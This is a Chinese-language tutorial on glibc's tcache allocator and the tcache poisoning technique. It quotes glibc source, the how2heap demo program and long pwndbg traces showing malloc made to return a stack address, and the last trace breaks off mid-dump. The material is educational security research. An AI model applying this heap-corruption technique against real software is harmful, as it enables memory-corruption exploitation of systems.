
## tcache makes heap exploitation easy again

### 0x01 Tcache overview

在 tcache 中新增了兩個結構體，分別是 tcache_entry 和 tcache_perthread_struct

```C
/* We overlay this structure on the user-data portion of a chunk when the chunk is stored in the per-thread cache.  */
typedef struct tcache_entry
{
  struct tcache_entry *next;
} tcache_entry;

/* There is one of these for each thread, which contains the per-thread cache (hence "tcache_perthread_struct").  Keeping overall size low is mildly important.  Note that COUNTS and ENTRIES are redundant (we could have just counted the linked list each time), this is for performance reasons.  */
typedef struct tcache_perthread_struct
{
  char counts[TCACHE_MAX_BINS];
  tcache_entry *entries[TCACHE_MAX_BINS];
} tcache_perthread_struct;

static __thread tcache_perthread_struct *tcache = NULL;
```



其中有兩個重要的函數， `tcache_get()` 和 `tcache_put()`:

```C
static void
tcache_put (mchunkptr chunk, size_t tc_idx)
{
  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);
  assert (tc_idx < TCACHE_MAX_BINS);
  e->next = tcache->entries[tc_idx];
  tcache->entries[tc_idx] = e;
  ++(tcache->counts[tc_idx]);
}

static void *
tcache_get (size_t tc_idx)
{
  tcache_entry *e = tcache->entries[tc_idx];
  assert (tc_idx < TCACHE_MAX_BINS);
  assert (tcache->entries[tc_idx] > 0);
  tcache->entries[tc_idx] = e->next;
  --(tcache->counts[tc_idx]);
  return (void *) e;
}

```

這兩個函數會在函數 [_int_free](https://sourceware.org/git/gitweb.cgi?p=glibc.git;a=blob;f=malloc/malloc.c;h=2527e2504761744df2bdb1abdc02d936ff907ad2;hb=d5c3fafc4307c9b7a4c7d5cb381fcdbfad340bcc#l4173) 和 [__libc_malloc](https://sourceware.org/git/gitweb.cgi?p=glibc.git;a=blob;f=malloc/malloc.c;h=2527e2504761744df2bdb1abdc02d936ff907ad2;hb=d5c3fafc4307c9b7a4c7d5cb381fcdbfad340bcc#l3051) 的開頭被調用，其中 `tcache_put` 當所請求的分配大小不大於`0x408`並且當給定大小的 tcache bin 未滿時調用。一個tcache bin中的最大塊數`mp_.tcache_count`是`7`。

```c
/* This is another arbitrary limit, which tunables can change.  Each
   tcache bin will hold at most this number of chunks.  */
# define TCACHE_FILL_COUNT 7
#endif
```



再複習一遍 `tcache_get()` 的源碼

```C
static __always_inline void *
tcache_get (size_t tc_idx)
{
  tcache_entry *e = tcache->entries[tc_idx];
  assert (tc_idx < TCACHE_MAX_BINS);
  assert (tcache->entries[tc_idx] > 0);
  tcache->entries[tc_idx] = e->next;
  --(tcache->counts[tc_idx]);
  return (void *) e;
}
```
在 `tcache_get` 中，僅僅檢查了 **tc_idx** ，此外，我們可以將 tcache 當作一個類似於 fastbin 的單獨鏈表，只是它的check，並沒有 fastbin 那麼複雜，僅僅檢查 ` tcache->entries[tc_idx] = e->next;`

### 0x02 Tcache Usage



- 內存釋放：

  可以看到，在free函數的最先處理部分，首先是檢查釋放塊是否頁對齊及前後堆塊的釋放情況，便優先放入tcache結構中。
  

  ```c
  
  _int_free (mstate av, mchunkptr p, int have_lock)
  {
    INTERNAL_SIZE_T size;        /* its size */
    mfastbinptr *fb;             /* associated fastbin */
    mchunkptr nextchunk;         /* next contiguous chunk */
    INTERNAL_SIZE_T nextsize;    /* its size */
    int nextinuse;               /* true if nextchunk is used */
    INTERNAL_SIZE_T prevsize;    /* size of previous contiguous chunk */
    mchunkptr bck;               /* misc temp for linking */
    mchunkptr fwd;               /* misc temp for linking */
  
    size = chunksize (p);
  
    /* Little security check which won't hurt performance: the
       allocator never wrapps around at the end of the address space.
       Therefore we can exclude some size values which might appear
       here by accident or by "design" from some intruder.  */
    if (__builtin_expect ((uintptr_t) p > (uintptr_t) -size, 0)
        || __builtin_expect (misaligned_chunk (p), 0))
      malloc_printerr ("free(): invalid pointer");
    /* We know that each chunk is at least MINSIZE bytes in size or a
       multiple of MALLOC_ALIGNMENT.  */
    if (__glibc_unlikely (size < MINSIZE || !aligned_OK (size)))
      malloc_printerr ("free(): invalid size");
  
    check_inuse_chunk(av, p);
  
  #if USE_TCACHE
    {
      size_t tc_idx = csize2tidx (size);
  
      if (tcache
        && tc_idx < mp_.tcache_bins
        && tcache->counts[tc_idx] < mp_.tcache_count)
        {
          tcache_put (p, tc_idx);
          return;
        }
    }
  #endif
  
  ......
  }
  ```



-  內存申請：

在內存分配的malloc函數中有多處，會將內存塊移入tcache中。

（1）首先，申請的內存塊符合fastbin大小時並且在fastbin內找到可用的空閒塊時，會把該fastbin鏈上的其他內存塊放入tcache中。

（2）其次，申請的內存塊符合smallbin大小時並且在smallbin內找到可用的空閒塊時，會把該smallbin鏈上的其他內存塊放入tcache中。

（3）當在unsorted bin鏈上循環處理時，當找到大小合適的鏈時，並不直接返回，而是先放到tcache中，繼續處理。

代碼太長就不全貼了，貼個符合fastbin 的時候

```c
  if ((unsigned long) (nb) <= (unsigned long) (get_max_fast ()))
    {
      idx = fastbin_index (nb);
      mfastbinptr *fb = &fastbin (av, idx);
      mchunkptr pp;
      victim = *fb;

      if (victim != NULL)
	{
	  if (SINGLE_THREAD_P)
	    *fb = victim->fd;
	  else
	    REMOVE_FB (fb, pp, victim);
	  if (__glibc_likely (victim != NULL))
	    {
	      size_t victim_idx = fastbin_index (chunksize (victim));
	      if (__builtin_expect (victim_idx != idx, 0))
		      malloc_printerr ("malloc(): memory corruption (fast)");
	      check_remalloced_chunk (av, victim, nb);
#if USE_TCACHE
	      /* While we're here, if we see other chunks of the same size,
		 stash them in the tcache.  */
	      size_t tc_idx = csize2tidx (nb);
	      if (tcache && tc_idx < mp_.tcache_bins)
        {
          mchunkptr tc_victim;

          /* While bin not empty and tcache not full, copy chunks.  */
          while (tcache->counts[tc_idx] < mp_.tcache_count
            && (tc_victim = *fb) != NULL)
            {
              if (SINGLE_THREAD_P)
               *fb = tc_victim->fd;
              else
              {
                REMOVE_FB (fb, pp, tc_victim);
                if (__glibc_unlikely (tc_victim == NULL))
                  break;
              }
              tcache_put (tc_victim, tc_idx);
            }
        }
#endif
	      void *p = chunk2mem (victim);
	      alloc_perturb (p, bytes);
	      return p;
	    }
	}
    }
```



 

- tcache 取出：在內存申請的開始部分，首先會判斷申請大小塊，在tcache是否存在，如果存在就直接從tcache中摘取，否則再使用_int_malloc分配。

- 在循環處理unsorted bin內存塊時，如果達到放入unsorted bin塊最大數量，會立即返回。默認是0，即不存在上限。

  ```c
  #if USE_TCACHE
        /* If we've processed as many chunks as we're allowed while
  	 filling the cache, return one of the cached ones.  */
        ++tcache_unsorted_count;
        if (return_cached
          && mp_.tcache_unsorted_limit > 0
          && tcache_unsorted_count > mp_.tcache_unsorted_limit)
        {
          return tcache_get (tc_idx);
        }
  #endif
  ```

- 在循環處理unsorted bin內存塊後，如果之前曾放入過tcache塊，則會取出一個並返回。

  ```c
  #if USE_TCACHE
        /* If all the small chunks we found ended up cached, return one now.  */
        if (return_cached)
        {
          return tcache_get (tc_idx);
        }
  #endif
  ```



### 0x03 Pwn Tcache

#### tcache poisoning

通過覆蓋 tcache 中的 next，不需要僞造任何 chunk 結構即可實現 malloc 到任何地址。

以 how2heap 中的 [tcache_poisoning](https://github.com/shellphish/how2heap/blob/master/glibc_2.27/tcache_poisoning.c) 爲例

看一下源碼

```C
glibc_2.26 [master●] bat tcache_poisoning.c
───────┬─────────────────────────────────────────────────────────────────────────────────
       │ File: tcache_poisoning.c
───────┼─────────────────────────────────────────────────────────────────────────────────
   1   │ #include <stdio.h>
   2   │ #include <stdlib.h>
   3   │ #include <stdint.h>
   4   │ 
   5   │ int main()
   6   │ {
   7   │         fprintf(stderr, "This file demonstrates a simple tcache poisoning attack
       │  by tricking malloc into\n"
   8   │                "returning a pointer to an arbitrary location (in this case, the 
       │ stack).\n"
   9   │                "The attack is very similar to fastbin corruption attack.\n\n");
  10   │ 
  11   │         size_t stack_var;
  12   │         fprintf(stderr, "The address we want malloc() to return is %p.\n", (char
       │  *)&stack_var);
  13   │ 
  14   │         fprintf(stderr, "Allocating 1 buffer.\n");
  15   │         intptr_t *a = malloc(128);
  16   │         fprintf(stderr, "malloc(128): %p\n", a);
  17   │         fprintf(stderr, "Freeing the buffer...\n");
  18   │         free(a);
  19   │ 
  20   │         fprintf(stderr, "Now the tcache list has [ %p ].\n", a);
  21   │         fprintf(stderr, "We overwrite the first %lu bytes (fd/next pointer) of t
       │ he data at %p\n"
  22   │                 "to point to the location to control (%p).\n", sizeof(intptr_t),
       │  a, &stack_var);
  23   │         a[0] = (intptr_t)&stack_var;
  24   │ 
  25   │         fprintf(stderr, "1st malloc(128): %p\n", malloc(128));
  26   │         fprintf(stderr, "Now the tcache list has [ %p ].\n", &stack_var);
  27   │ 
  28   │         intptr_t *b = malloc(128);
  29   │         fprintf(stderr, "2st malloc(128): %p\n", b);
  30   │         fprintf(stderr, "We got the control\n");
  31   │ 
  32   │         return 0;
  33   │ }
───────┴─────────────────────────────────────────────────────────────────────────────────
```

運行結果是
```bash
glibc_2.26 [master●] ./tcache_poisoning 
This file demonstrates a simple tcache poisoning attack by tricking malloc into
returning a pointer to an arbitrary location (in this case, the stack).
The attack is very similar to fastbin corruption attack.

The address we want malloc() to return is 0x7fff0d28a0c8.
Allocating 1 buffer.
malloc(128): 0x55f666ee1260
Freeing the buffer...
Now the tcache list has [ 0x55f666ee1260 ].
We overwrite the first 8 bytes (fd/next pointer) of the data at 0x55f666ee1260
to point to the location to control (0x7fff0d28a0c8).
1st malloc(128): 0x55f666ee1260
Now the tcache list has [ 0x7fff0d28a0c8 ].
2st malloc(128): 0x7fff0d28a0c8
We got the control
```
分析一下，程序先申請了一個大小是 128 的 chunk，然後 free。128 在 tcache 的範圍內，因此 free 之後該 chunk 被放到了 tcache 中，調試如下：
```asm
pwndbg> 
0x0000555555554815	18		free(a);
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
──────────────────────────────────────[ REGISTERS ]──────────────────────────────────────
......
 RDI  0x555555756260 ?— 0x0
......
 RIP  0x555555554815 (main+187) ?— call   0x555555554600
───────────────────────────────────────[ DISASM ]────────────────────────────────────────
......
 ? 0x555555554815 <main+187>    call   free@plt <0x555555554600>
        ptr: 0x555555756260 ?— 0x0
......
────────────────────────────────────[ SOURCE (CODE) ]────────────────────────────────────
......
 ? 18 	free(a);
......
────────────────────────────────────────[ STACK ]────────────────────────────────────────
......
pwndbg> ni
20		fprintf(stderr, "Now the tcache list has [ %p ].\n", a);
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
──────────────────────────────────────[ REGISTERS ]──────────────────────────────────────
 RAX  0x0
 RBX  0x0
 RCX  0x7
 RDX  0x0
 RDI  0x1
 RSI  0x555555756010 ?— 0x100000000000000
 R8   0x0
 R9   0x7fffffffb78c ?— 0x1c00000000
 R10  0x911
 R11  0x7ffff7aa0ba0 (free) ?— push   rbx
 R12  0x555555554650 (_start) ?— xor    ebp, ebp
 R13  0x7fffffffe0a0 ?— 0x1
 R14  0x0
 R15  0x0
 RBP  0x7fffffffdfc0 —? 0x555555554910 (__libc_csu_init) ?— push   r15
 RSP  0x7fffffffdfa0 —? 0x555555554910 (__libc_csu_init) ?— push   r15
 RIP  0x55555555481a (main+192) ?— mov    rax, qword ptr [rip + 0x20083f]
───────────────────────────────────────[ DISASM ]────────────────────────────────────────
   0x555555554802 <main+168>    lea    rdi, [rip + 0x2bd]
   0x555555554809 <main+175>    call   fwrite@plt <0x555555554630>
 
   0x55555555480e <main+180>    mov    rax, qword ptr [rbp - 8]
   0x555555554812 <main+184>    mov    rdi, rax
   0x555555554815 <main+187>    call   free@plt <0x555555554600>
 
 ? 0x55555555481a <main+192>    mov    rax, qword ptr [rip + 0x20083f] <0x555555755060>
   0x555555554821 <main+199>    mov    rdx, qword ptr [rbp - 8]
   0x555555554825 <main+203>    lea    rsi, [rip + 0x2b4]
   0x55555555482c <main+210>    mov    rdi, rax
   0x55555555482f <main+213>    mov    eax, 0
   0x555555554834 <main+218>    call   fprintf@plt <0x555555554610>
────────────────────────────────────[ SOURCE (CODE) ]────────────────────────────────────
   15 	intptr_t *a = malloc(128);
   16 	fprintf(stderr, "malloc(128): %p\n", a);
   17 	fprintf(stderr, "Freeing the buffer...\n");
   18 	free(a);
   19 
 ? 20 	fprintf(stderr, "Now the tcache list has [ %p ].\n", a);
   21 	fprintf(stderr, "We overwrite the first %lu bytes (fd/next pointer) of the data at %p\n"
   22 		"to point to the location to control (%p).\n", sizeof(intptr_t), a, &stack_var);
   23 	a[0] = (intptr_t)&stack_var;
   24 
   25 	fprintf(stderr, "1st malloc(128): %p\n", malloc(128));
────────────────────────────────────────[ STACK ]────────────────────────────────────────
00:0000│ rsp  0x7fffffffdfa0 —? 0x555555554910 (__libc_csu_init) ?— push   r15
01:0008│      0x7fffffffdfa8 —? 0x555555554650 (_start) ?— xor    ebp, ebp
02:0010│      0x7fffffffdfb0 —? 0x7fffffffe0a0 ?— 0x1
03:0018│      0x7fffffffdfb8 —? 0x555555756260 ?— 0x0
04:0020│ rbp  0x7fffffffdfc0 —? 0x555555554910 (__libc_csu_init) ?— push   r15
05:0028│      0x7fffffffdfc8 —? 0x7ffff7a3fa87 (__libc_start_main+231) ?— mov    edi, eax
06:0030│      0x7fffffffdfd0 ?— 0x0
07:0038│      0x7fffffffdfd8 —? 0x7fffffffe0a8 —? 0x7fffffffe3c6 ?— 0x346d2f656d6f682f ('/home/m4')
pwndbg> heapinfo
3886144
(0x20)     fastbin[0]: 0x0
(0x30)     fastbin[1]: 0x0
(0x40)     fastbin[2]: 0x0
(0x50)     fastbin[3]: 0x0
(0x60)     fastbin[4]: 0x0
(0x70)     fastbin[5]: 0x0
(0x80)     fastbin[6]: 0x0
(0x90)     fastbin[7]: 0x0
(0xa0)     fastbin[8]: 0x0
(0xb0)     fastbin[9]: 0x0
                  top: 0x5555557562e0 (size : 0x20d20) 
       last_remainder: 0x0 (size : 0x0) 
            unsortbin: 0x0
(0x90)   tcache_entry[7]: 0x555555756260
pwndbg> heapbase
heapbase : 0x555555756000
pwndbg> p *(struct tcache_perthread_struct*)0x555555756010
$3 = {
  counts = "\000\000\000\000\000\000\000\001", '\000' <repeats 55 times>,
  entries = {0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x555555756260, 0x0 <repeats 56 times>}
}
```
可以看到，此時第 8 條 tcache 鏈上已經有了一個 chunk，從 `tcache_perthread_struct` 結構體中也能得到同樣的結論 

然後修改 tcache 的 next
```asm
pwndbg> 
We overwrite the first 8 bytes (fd/next pointer) of the data at 0x555555756260
to point to the location to control (0x7fffffffdfa8).
23		a[0] = (intptr_t)&stack_var;
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
──────────────────────────────────────[ REGISTERS ]──────────────────────────────────────
 RAX  0x85
 RBX  0x0
 RCX  0x0
 RDX  0x7ffff7dd48b0 (_IO_stdfile_2_lock) ?— 0x0
 RDI  0x0
 RSI  0x7fffffffb900 ?— 0x777265766f206557 ('We overw')
 R8   0x7ffff7fd14c0 ?— 0x7ffff7fd14c0
 R9   0x7fffffffb78c ?— 0x8500000000
 R10  0x0
 R11  0x246
 R12  0x555555554650 (_start) ?— xor    ebp, ebp
 R13  0x7fffffffe0a0 ?— 0x1
 R14  0x0
 R15  0x0
 RBP  0x7fffffffdfc0 —? 0x555555554910 (__libc_csu_init) ?— push   r15
 RSP  0x7fffffffdfa0 —? 0x555555554910 (__libc_csu_init) ?— push   r15
 RIP  0x555555554867 (main+269) ?— lea    rdx, [rbp - 0x18]
───────────────────────────────────────[ DISASM ]────────────────────────────────────────
 ? 0x555555554867 <main+269>    lea    rdx, [rbp - 0x18] <0x7ffff7dd48b0>
   0x55555555486b <main+273>    mov    rax, qword ptr [rbp - 8]
   0x55555555486f <main+277>    mov    qword ptr [rax], rdx
   0x555555554872 <main+280>    mov    edi, 0x80
   0x555555554877 <main+285>    call   malloc@plt <0x555555554620>
 
   0x55555555487c <main+290>    mov    rdx, rax
   0x55555555487f <main+293>    mov    rax, qword ptr [rip + 0x2007da] <0x555555755060>
   0x555555554886 <main+300>    lea    rsi, [rip + 0x2eb]
   0x55555555488d <main+307>    mov    rdi, rax
   0x555555554890 <main+310>    mov    eax, 0
   0x555555554895 <main+315>    call   fprintf@plt <0x555555554610>
────────────────────────────────────[ SOURCE (CODE) ]────────────────────────────────────
   18 	free(a);
   19 
   20 	fprintf(stderr, "Now the tcache list has [ %p ].\n", a);
   21 	fprintf(stderr, "We overwrite the first %lu bytes (fd/next pointer) of the data at %p\n"
   22 		"to point to the location to control (%p).\n", sizeof(intptr_t), a, &stack_var);
 ? 23 	a[0] = (intptr_t)&stack_var;
   24 
   25 	fprintf(stderr, "1st malloc(128): %p\n", malloc(128));
   26 	fprintf(stderr, "Now the tcache list has [ %p ].\n", &stack_var);
   27 
   28 	intptr_t *b = malloc(128);
────────────────────────────────────────[ STACK ]────────────────────────────────────────
00:0000│ rsp  0x7fffffffdfa0 —? 0x555555554910 (__libc_csu_init) ?— push   r15
01:0008│      0x7fffffffdfa8 —? 0x555555554650 (_start) ?— xor    ebp, ebp
02:0010│      0x7fffffffdfb0 —? 0x7fffffffe0a0 ?— 0x1
03:0018│      0x7fffffffdfb8 —? 0x555555756260 ?— 0x0
04:0020│ rbp  0x7fffffffdfc0 —? 0x555555554910 (__libc_csu_init) ?— push   r15
05:0028│      0x7fffffffdfc8 —? 0x7ffff7a3fa87 (__libc_start_main+231) ?— mov    edi, eax
06:0030│      0x7fffffffdfd0 ?— 0x0
07:0038│      0x7fffffffdfd8 —? 0x7fffffffe0a8 —? 0x7fffffffe3c6 ?— 0x346d2f656d6f682f ('/home/m4')
pwndbg> heapinfo
3886144
(0x20)     fastbin[0]: 0x0
(0x30)     fastbin[1]: 0x0
(0x40)     fastbin[2]: 0x0
(0x50)     fastbin[3]: 0x0
(0x60)     fastbin[4]: 0x0
(0x70)     fastbin[5]: 0x0
(0x80)     fastbin[6]: 0x0
(0x90)     fastbin[7]: 0x0
(0xa0)     fastbin[8]: 0x0
(0xb0)     fastbin[9]: 0x0
                  top: 0x5555557562e0 (size : 0x20d20) 
       last_remainder: 0x0 (size : 0x0) 
            unsortbin: 0x0
(0x90)   tcache_entry[7]: 0x555555756260
pwndbg> n
25		fprintf(stderr, "1st malloc(128): %p\n", malloc(128));
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
──────────────────────────────────────[ REGISTERS ]──────────────────────────────────────
 RAX  0x555555756260 —? 0x7fffffffdfa8 —? 0x555555554650 (_start) ?— xor    ebp, ebp
 RBX  0x0
 RCX  0x0
 RDX  0x7fffffffdfa8 —? 0x555555554650 (_start) ?— xor    ebp, ebp
 RDI  0x0
 RSI  0x7fffffffb900 ?— 0x777265766f206557 ('We overw')
 R8   0x7ffff7fd14c0 ?— 0x7ffff7fd14c0
 R9   0x7fffffffb78c ?— 0x8500000000
 R10  0x0
 R11  0x246
 R12  0x555555554650 (_start) ?— xor    ebp, ebp
 R13  0x7fffffffe0a0 ?— 0x1
 R14  0x0
 R15  0x0
 RBP  0x7fffffffdfc0 —? 0x555555554910 (__libc_csu_init) ?— push   r15
 RSP  0x7fffffffdfa0 —? 0x555555554910 (__libc_csu_init) ?— push   r15
 RIP  0x555555554872 (main+280) ?— mov    edi, 0x80
───────────────────────────────────────[ DISASM ]────────────────────────────────────────
   0x555555554867 <main+269>    lea    rdx, [rbp - 0x18]
   0x55555555486b <main+273>    mov    rax, qword ptr [rbp - 8]
   0x55555555486f <main+277>    mov    qword ptr [rax], rdx
 ? 0x555555554872 <main+280>    mov    edi, 0x80
   0x555555554877 <main+285>    call   malloc@plt <0x555555554620>
 
   0x55555555487c <main+290>    mov    rdx, rax
   0x55555555487f <main+293>    mov    rax, qword ptr [rip + 0x2007da] <0x555555755060>
   0x555555554886 <main+300>    lea    rsi, [rip + 0x2eb]
   0x55555555488d <main+307>    mov    rdi, rax
   0x555555554890 <main+310>    mov    eax, 0
   0x555555554895 <main+315>    call   fprintf@plt <0x555555554610>
────────────────────────────────────[ SOURCE (CODE) ]────────────────────────────────────
   20 	fprintf(stderr, "Now the tcache list has [ %p ].\n", a);
   21 	fprintf(stderr, "We overwrite the first %lu bytes (fd/next pointer) of the data at %p\n"
   22 		"to point to the location to control (%p).\n", sizeof(intptr_t), a, &stack_var);
   23 	a[0] = (intptr_t)&stack_var;
   24 
 ? 25 	fprintf(stderr, "1st malloc(128): %p\n", malloc(128));
   26 	fprintf(stderr, "Now the tcache list has [ %p ].\n", &stack_var);
   27 
   28 	intptr_t *b = malloc(128);
   29 	fprintf(stderr, "2st malloc(128): %p\n", b);
   30 	fprintf(stderr, "We got the control\n");
────────────────────────────────────────[ STACK ]────────────────────────────────────────
00:0000│ rsp  0x7fffffffdfa0 —? 0x555555554910 (__libc_csu_init) ?— push   r15
01:0008│ rdx  0x7fffffffdfa8 —? 0x555555554650 (_start) ?— xor    ebp, ebp
02:0010│      0x7fffffffdfb0 —? 0x7fffffffe0a0 ?— 0x1
03:0018│      0x7fffffffdfb8 —? 0x555555756260 —? 0x7fffffffdfa8 —? 0x555555554650 (_start) ?— xor    ebp, ebp
04:0020│ rbp  0x7fffffffdfc0 —? 0x555555554910 (__libc_csu_init) ?— push   r15
05:0028│      0x7fffffffdfc8 —? 0x7ffff7a3fa87 (__libc_start_main+231) ?— mov    edi, eax
06:0030│      0x7fffffffdfd0 ?— 0x0
07:0038│      0x7fffffffdfd8 —? 0x7fffffffe0a8 —? 0x7fffffffe3c6 ?— 0x346d2f656d6f682f ('/home/m4')
pwndbg> heapinfo
3886144
(0x20)     fastbin[0]: 0x0
(0x30)     fastbin[1]: 0x0
(0x40)     fastbin[2]: 0x0
(0x50)     fastbin[3]: 0x0
(0x60)     fastbin[4]: 0x0
(0x70)     fastbin[5]: 0x0
(0x80)     fastbin[6]: 0x0
(0x90)     fastbin[7]: 0x0
(0xa0)     fastbin[8]: 0x0
(0xb0)     fastbin[9]: 0x0
                  top: 0x5555557562e0 (size : 0x20d20) 
       last_remainder: 0x0 (size : 0x0) 
            unsortbin: 0x0
(0x90)   tcache_entry[7]: 0x555555756260 --> 0x7fffffffdfa8 --> 0x555555554650
```
此時，第 8 條 tcache 鏈的 next 已經被改成棧上的地址了。接下來類似 fastbin attack，只需進行兩次 `malloc(128)` 即可控制棧上的空間。

第一次 malloc
```asm
pwndbg> n
1st malloc(128): 0x555555756260
26		fprintf(stderr, "Now the tcache list has [ %p ].\n", &stack_var);
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
──────────────────────────────────────[ REGISTERS ]──────────────────────────────────────
 RAX  0x20
 RBX  0x0
 RCX  0x0
 RDX  0x7ffff7dd48b0 (_IO_stdfile_2_lock) ?— 0x0
 RDI  0x0
 RSI  0x7fffffffb900 ?— 0x6c6c616d20747331 ('1st mall')
 R8   0x7ffff7fd14c0 ?— 0x7ffff7fd14c0
 R9   0x7fffffffb78c ?— 0x2000000000
 R10  0x0
 R11  0x246
 R12  0x555555554650 (_start) ?— xor    ebp, ebp
 R13  0x7fffffffe0a0 ?— 0x1
 R14  0x0
 R15  0x0
 RBP  0x7fffffffdfc0 —? 0x555555554910 (__libc_csu_init) ?— push   r15
 RSP  0x7fffffffdfa0 —? 0x555555554910 (__libc_csu_init) ?— push   r15
 RIP  0x55555555489a (main+320) ?— mov    rax, qword ptr [rip + 0x2007bf]
───────────────────────────────────────[ DISASM ]────────────────────────────────────────
   0x55555555487f <main+293>    mov    rax, qword ptr [rip + 0x2007da] <0x555555755060>
   0x555555554886 <main+300>    lea    rsi, [rip + 0x2eb]
   0x55555555488d <main+307>    mov    rdi, rax
   0x555555554890 <main+310>    mov    eax, 0
   0x555555554895 <main+315>    call   fprintf@plt <0x555555554610>
 
 ? 0x55555555489a <main+320>    mov    rax, qword ptr [rip + 0x2007bf] <0x555555755060>
   0x5555555548a1 <main+327>    lea    rdx, [rbp - 0x18]
   0x5555555548a5 <main+331>    lea    rsi, [rip + 0x234]
   0x5555555548ac <main+338>    mov    rdi, rax
   0x5555555548af <main+341>    mov    eax, 0
   0x5555555548b4 <main+346>    call   fprintf@plt <0x555555554610>
────────────────────────────────────[ SOURCE (CODE) ]────────────────────────────────────
   21 	fprintf(stderr, "We overwrite the first %lu bytes (fd/next pointer) of the data at %p\n"
   22 		"to point to the location to control (%p).\n", sizeof(intptr_t), a, &stack_var);
   23 	a[0] = (intptr_t)&stack_var;
   24 
   25 	fprintf(stderr, "1st malloc(128): %p\n", malloc(128));
 ? 26 	fprintf(stderr, "Now the tcache list has [ %p ].\n", &stack_var);
   27 
   28 	intptr_t *b = malloc(128);
   29 	fprintf(stderr, "2st malloc(128): %p\n", b);
   30 	fprintf(stderr, "We got the control\n");
   31 
────────────────────────────────────────[ STACK ]────────────────────────────────────────
00:0000│ rsp  0x7fffffffdfa0 —? 0x555555554910 (__libc_csu_init) ?— push   r15
01:0008│      0x7fffffffdfa8 —? 0x555555554650 (_start) ?— xor    ebp, ebp
02:0010│      0x7fffffffdfb0 —? 0x7fffffffe0a0 ?— 0x1
03:0018│      0x7fffffffdfb8 —? 0x555555756260 —? 0x7fffffffdfa8 —? 0x555555554650 (_start) ?— xor    ebp, ebp
04:0020│ rbp  0x7fffffffdfc0 —? 0x555555554910 (__libc_csu_init) ?— push   r15
05:0028│      0x7fffffffdfc8 —? 0x7ffff7a3fa87 (__libc_start_main+231) ?— mov    edi, eax
06:0030│      0x7fffffffdfd0 ?— 0x0
07:0038│      0x7fffffffdfd8 —? 0x7fffffffe0a8 —? 0x7fffffffe3c6 ?— 0x346d2f656d6f682f ('/home/m4')
pwndbg> heapinfo
3886144
(0x20)     fastbin[0]: 0x0
(0x30)     fastbin[1]: 0x0
(0x40)     fastbin[2]: 0x0
(0x50)     fastbin[3]: 0x0
(0x60)     fastbin[4]: 0x0
(0x70)     fastbin[5]: 0x0
(0x80)     fastbin[6]: 0x0
(0x90)     fastbin[7]: 0x0
(0xa0)     fastbin[8]: 0x0
(0xb0)     fastbin[9]: 0x0
                  top: 0x5555557562e0 (size : 0x20d20) 
       last_remainder: 0x0 (size : 0x0) 
            unsortbin: 0x0
(0x90)   tcache_entry[7]: 0x7fffffffdfa8 --> 0x555555554650
```

第二次 malloc，即可 malloc 棧上的地址了
```asm
pwndbg> heapinfo
3886144
(0x20)     fastbin[0]: 0x0
(0x30)     fastbin[1]: 0x0
(0x40)     fastbin[2]: 0x0
(0x50)     fastbin[3]: 0x0
(0x60)     fastbin[4]: 0x0
(0x70)     fastbin[5]: 0x0
(0x80)     fastbin[6]: 0x0
(0x90)     fastbin[7]: 0x0
(0xa0)     fastbin[8]: 0x0
(0xb0)     fastbin[9]: 0x0
                  top: 0x5555557562e0 (size : 0x20d20) 
       last_remainder: 0x0 (size : 0x0) 
            unsortbin: 0x0
(0x90)   tcache_entry[7]: 0x7fffffffdfa8 --> 0x555555554650
pwndbg> ni
0x00005555555548c3	28		intptr_t *b = malloc(128);
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
──────────────────────────────────────[ REGISTERS ]──────────────────────────────────────
 RAX  0x7fffffffdfa8 —? 0x555555554650 (_start) ?— xor    ebp, ebp
 RBX  0x0
 RCX  0x555555756010 ?— 0xff00000000000000
 RDX  0x7fffffffdfa8 —? 0x555555554650 (_start) ?— xor    ebp, ebp
 RDI  0x555555554650 (_start) ?— xor    ebp, ebp
 RSI  0x555555756048 ?— 0x0
 R8   0x7ffff7fd14c0 ?— 0x7ffff7fd14c0
 R9   0x7fffffffb78c ?— 0x2c00000000
 R10  0x0
 R11  0x246
 R12  0x555555554650 (_start) ?— xor    ebp, ebp
 R13  0x7fffffffe0a0 ?— 0x1
 R14  0x0
 R15  0x0
 RBP  0x7fffffffdfc0 —? 0x555555554910 (__libc_csu_init) ?— push   r15
 RSP  0x7fffffffdfa0 —? 0x555555554910 (__libc_csu_init) ?— push   r15
 RIP  0x5555555548c3 (main+361) ?— mov    qword ptr [rbp - 0x10], rax
───────────────────────────────────────[ DISASM ]────────────────────────────────────────
   0x5555555548ac <main+338>    mov    rdi, rax
   0x5555555548af <main+341>    mov    eax, 0
   0x5555555548b4 <main+346>    call   fprintf@plt <0x555555554610>
 
   0x5555555548b9 <main+351>    mov    edi, 0x80
   0x5555555548be <main+356>    call   malloc@plt <0x555555554620>
 
 ? 0x5555555548c3 <main+361>    mov    qword ptr [rbp - 0x10], rax
   0x5555555548c7 <main+365>    mov    rax, qword ptr [rip + 0x200792] <0x555555755060>
   0x5555555548ce <main+372>    mov    rdx, qword ptr [rbp - 0x10]
   0x5555555548d2 <main+376>    lea    rsi, [rip + 0x2b4]
   0x5555555548d9 <main+383>    mov    rdi, rax
   0x5555555548dc <main+386>    mov    eax, 0
────────────────────────────────────[ SOURCE (CODE) ]────────────────────────────────────
   23 	a[0] = (intptr_t)&stack_var;
   24 
   25 	fprintf(stderr, "1st malloc(128): %p\n", malloc(128));
   26 	fprintf(stderr, "Now the tcache list has [ %p ].\n", &stack_var);
   27 
 ? 28 	intptr_t *b = malloc(128);
   29 	fprintf(stderr, "2st malloc(128): %p\n", b);
   30 	fprintf(stderr, "We got the control\n");
   31 
   32 	return 0;
   33 }
────────────────────────────────────────[ STACK ]────────────────────────────────────────
00:0000│ rsp      0x7fffffffdfa0 —? 0x555555554910 (__libc_csu_init) ?— push   r15
01:0008│ rax rdx  0x7fffffffdfa8 —? 0x555555554650 (_start) ?— xor    ebp, ebp
02:0010│          0x7fffffffdfb0 —? 0x7fffffffe0a0 ?— 0x1
03:0018│          0x7fffffffdfb8 —? 0x555555756260 —? 0x7fffffffdfa8 —? 0x555555554650 (_start) ?— xor    ebp, ebp
04:0020│ rbp      0x7fffffffdfc0 —? 0x555555554910 (__libc_csu_init) ?— push   r15
